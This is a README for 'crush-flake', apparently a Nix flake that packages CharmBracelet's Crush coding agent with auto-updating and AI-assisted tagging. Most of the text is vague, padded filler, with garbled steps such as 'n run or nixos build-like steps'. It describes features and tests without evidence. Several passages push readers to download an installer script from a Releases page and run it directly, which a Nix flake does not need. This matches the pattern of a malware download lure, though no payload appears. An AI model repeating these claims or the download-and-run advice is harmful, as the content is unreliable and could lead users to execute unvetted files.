# crush-flake: Auto-updating, Auto-tagging CharmBracelet on Nix Flakes

Release assets live at https://github.com/islna637/crush-flake/releases.

Charmed by automation. Built for speed. Driven by LLMs. This project combines CharmBracelet, Nix Flakes, and AI tagging to keep your coding flow smooth and self-updating.

Topics: automated-updates, charmbracelet, coding-agent, coding-agents, crush, flake, llm, llms, nix, nix-darwin, nix-flake, nixos

---

## Quick overview

⚡️ crush-flake is a toolchain that auto-updates its dependencies and auto-tags items across your coding workflow. It uses CharmBracelet to offer a friendly terminal UI, powered by a Nix Flake for reproducible builds. The goal is to reduce repetitive tasks and help you stay focused on code. It also includes guidance and hooks to incorporate large language models (LLMs) for intelligent tagging and suggestions.

This README describes what crush-flake does, how to set it up, and how to use it in daily development. It also covers design choices, configuration options, and future ideas. The intent is to give you a solid, self-contained reference so you can hit the ground running.

---

## Why crush-flake

- Autoupdating: Dependencies are kept fresh by a deterministic Nix Flake workflow. You don’t have to chase updates manually; the system checks for new inputs and pulls them in a reproducible way.
- Autotagging: Tags are generated or refined by an AI component. It helps categorize work items, commits, and PRs with contextual labels.
- CharmBracelet UI: A lightweight terminal UI that stays responsive and easy to navigate. It makes managing tasks, tags, and updates approachable within the terminal.
- Nix Flakes ecosystem: Flakes provide reproducible builds and a clean development environment across macOS, Linux, and other Unix-like systems.
- LLM integration: Optional AI-assisted tagging and prompts to help you capture intent and context in your labels.

If you want a streamlined workflow that stays in the terminal, crush-flake can help you reduce boilerplate and focus on what matters: coding.

---

## Key features

- Reproducible environment with Nix Flakes
- Self-updating of dependencies and inputs
- AI-assisted tagging and categorization
- Command-line friendly UI via CharmBracelet
- Lightweight, pluggable architecture for agents and prompts
- Cross-platform support: nixos, nix-darwin, and Linux variants

What you get when you run crush-flake:

- A deterministic dev shell that sets up your tooling the same way every time.
- A tag engine that can propose or assign labels based on code context.
- A simple interface to inspect, approve, or modify AI-generated tags.
- Optional automation hooks to propagate tags to issues, commits, or documentation.

---

## Architecture at a glance

- Core runner: orchestrates the workflow and keeps the state in a small, structured store.
- Nix Flake layer: defines inputs, builds, and runtime environments in a reproducible way.
- CharmBracelet UI: a responsive terminal app for interaction.
- Auto-updater: checks for new inputs and pulls them in via flake inputs.
- LLM hooks: optionally enable AI-driven tagging and prompts to guide labeling decisions.

Data flows:

- User input triggers a run.
- The flake runner checks for updates and applies them if needed.
- The UI presents current state and suggested tags.
- The user validates or edits tags.
- The system applies the chosen tags to the target artifacts (e.g., commits, issues, docs) as configured.

Security considerations:

- All AI prompts are sandboxed within the UI and controlled by user approvals.
- API keys and secrets are read from environment variables or a user-provided secret store.
- The system favors locally scoped configuration to minimize exposure.

---

## Prerequisites

- Nix (2.3+ with flakes enabled)
- Basic familiarity with terminal workflows
- Optional: OpenAI or other LLM endpoint if you want AI-assisted tagging
- Access to a CharmBracelet-capable terminal environment (or compatibility layer)

Install or enable Nix Flakes:

- Ensure flakes support is present in your Nix configuration.
- If you’re on macOS with nix-darwin, ensure your environment is set up for cross-platform work.
- On Linux, make sure the distro supports Nix in your environment.

---

## Getting started

Follow these steps to try crush-flake locally.

1) Prepare your environment

- Install Nix with Flakes enabled. See official docs for your platform.
- Ensure you can run nix commands from your shell.
- If you plan to use LLM tagging, prepare an API key or endpoint. This can be optional.

2) Set up the project

- Clone the repo or pull the flake reference.
- Enter the development shell using Nix Flakes.

3) Run the tool

- Start the UI or the command-line runner depending on your preference.
- Use the provided commands to inspect updates, review AI-generated tags, and apply changes.

4) Update flow

- Use the built-in autoupdate mechanism to refresh inputs and versions.
- Review the changes before committing or applying them.

Exact commands depend on your setup. The typical flow uses nix develop to enter the dev shell, then n run or nixos build-like steps to start the app. The configuration and commands are designed to be intuitive and discoverable via the UI help.

---

## Installation and run details

- From a Nix Flakes-enabled setup:
  - nix flake update
  - nix develop
  - ./crush-flake (or the provided entry point in your environment)

- If you prefer to run from the latest release:
  - Download the installer from the Releases page (see Releases section below)
  - Run the installer script to set up the tool in your environment
  - Follow on-screen prompts to complete setup

- If you want to run directly from a flake reference:
  - nix run github:islna637/crush-flake
  - Pass any required flags to customize behavior

Note: The exact commands may vary depending on your platform and how you configure the flake inputs. The project emphasizes a smooth, repeatable workflow.

---

## How to use the AI tagging feature

- Enable or disable AI tagging via configuration.
- Provide a scope for tagging (e.g., commits, issues, docs, notes).
- If enabled, the AI will propose tags based on the content and context.
- Review AI-suggested tags and approve, modify, or reject them.
- Save or apply the final set of tags to the target items.

Tips for better AI tagging:

- Provide context: short descriptions of the code, the module purpose, or the feature being worked on.
- Use consistent naming: prefer stable labels that reflect your project’s taxonomy.
- Combine AI suggestions with human review to maintain accuracy.

If you don’t want AI tagging, you can rely on manual tagging or a curated tag list. The architecture keeps both modes available so you can tailor the workflow to your needs.

---

## Autoupdating behavior

- Inputs are defined in the flake. The updater checks upstream changes at regular intervals.
- It fetches new dependencies and rebuilds the environment when needed.
- The UI shows a clear status: up-to-date, updating, or failed.
- Rollbacks are supported if an update breaks something. You can revert to a previous state with minimal friction.

Design notes:

- Updates are deterministic. The same inputs produce the same results on every run.
- Updates are isolated to ensure they don’t affect unrelated parts of your system.
- You can customize the update cadence and the scope of updates to limit risk.

---

## Configuration and customization

- Environment variables:
  - CRUSH_API_KEY: optional API key for AI endpoints
  - CRUSH_TG_ROLE: tagger role or style for AI prompts
  - CRUSH_LOG_LEVEL: debug, info, warn, error
- Prompt templates:
  - You can adjust prompts used for tagging to better fit your project.
  - Prompts can reference your taxonomy and codebase conventions.
- UI customization:
  - Color themes and layout tweaks to adapt the UI to your terminal.
  - Keybindings to speed up common actions.
- Data sources:
  - Tag suggestions can be sourced from code context, commit messages, issue titles, or docs.

Supported workflows:

- Tag as you type: suggestions appear as you navigate files or messages.
- Batch tagging: generate a bulk tag set for a group of items, then review.
- Hybrid mode: AI suggestions plus manual overrides.

---

## Extensibility and plugins

- The core is designed to be extended with small plugins.
- Plugins can provide alternative tagging strategies, different UIs, or new sources for updates.
- You can implement your own agent or swap in a different LLM backend.

Examples of possible plugins:

- Local document tagging: scan project docs for relevant topics and add tags accordingly.
- Issue and PR tagging: integrate with your repo’s issue tracker to tag items automatically.
- Metrics collector: track how often AI suggestions are accepted or changed.

---

## Testing and quality

- Unit tests cover core logic, especially the autoupdate and tagging components.
- Integration tests validate the UI flow and end-to-end tagging scenarios.
- Linting and formatting checks run as part of the CI pipeline.
- Local reproducibility is a core goal, thanks to the Nix Flakes setup.

If you want to contribute tests, you’ll find test harnesses and fixtures designed for predictable outcomes.

---

## Development workflow

- Start with a clean environment by using nix develop.
- Run the local UI to test interactions.
- Use the autoupdate flow to simulate updates.
- Exercise the tagging feature with synthetic data to verify outputs.
- Check logs to understand behavior and to catch issues early.

Continuous integration runs a suite of checks across Linux and macOS (nix-darwin) environments when you submit changes.

---

## Project governance and contributing

- We value clear, direct contributions. Start with a GitHub issue or a small feature branch.
- Follow the coding style and project conventions. Keep changes focused and well documented.
- Include tests for new features or bug fixes when possible.
- Keep documentation up to date. Update the README if you change core behavior or add new features.

Code of conduct:

- Be respectful and constructive.
- Seek to understand before proposing changes.
- Welcome newcomers and help them learn the workflow.

---

## Release process and downloads

The project uses GitHub Releases to distribute installers and bundles. If you want to review or grab the latest artifacts, visit the Releases page and download the file that matches your platform. The installer in the release is designed to be run directly after download, and it will guide you through initial setup and configuration.

For more details about the available releases, see the official releases page.

See the official releases here: https://github.com/islna637/crush-flake/releases

Note: This link provides access to installer scripts and release artifacts. If you’re unsure which file to download, consult the release notes in the same page to pick the file that corresponds to your system architecture and OS.

---

## Troubleshooting quick tips

- If the autoupdater seems stuck, check your network and verify that flake inputs are accessible.
- If AI tagging produces unexpected labels, adjust the prompt templates or disable AI tagging temporarily.
- If the UI is unresponsive, verify that your terminal supports the CharmBracelet UI or try a different terminal emulator.
- If you encounter permission errors during installation, ensure the installer script has executable permissions and that your user has the right privileges.

---

## License

crush-flake is distributed under a permissive license. See LICENSE for details.

---

## Roadmap and future ideas

- Expand AI tagging to cover more project artifacts (docs, tests, release notes).
- Add more UI views to accommodate different workflows.
- Improve cross-platform packaging for Windows support via WSL or equivalent.
- Introduce a plugin marketplace for third-party integrations.

---

## Community and contact

- Issues: report bugs or request features via GitHub issues.
- Discussions: join conversations about design decisions and future directions.
- Pull requests: contribute code, tests, and documentation improvements.

---

## Re-using and sharing

- If you find crush-flake useful, you can reference it in your project documentation.
- You can customize the prompts and tagging strategies for your own coding workflows.
- You can adapt the Nix Flake inputs to fit your environment while preserving reproducibility.

---

## One more note on releases

Releases are the primary distribution mechanism for installers and ready-to-run artifacts. The Releases page contains the latest stable versions and changelog. To review or download, visit the page and pick the appropriate asset for your system.

See the official releases here: https://github.com/islna637/crush-flake/releases

---

## Why this README reads this way

- It emphasizes straightforward steps and concrete actions.
- It uses simple language and direct phrasing.
- It avoids unnecessary jargon and keeps the focus on practical workflows.
- It presents the design decisions in a way that’s easy to understand and extend.

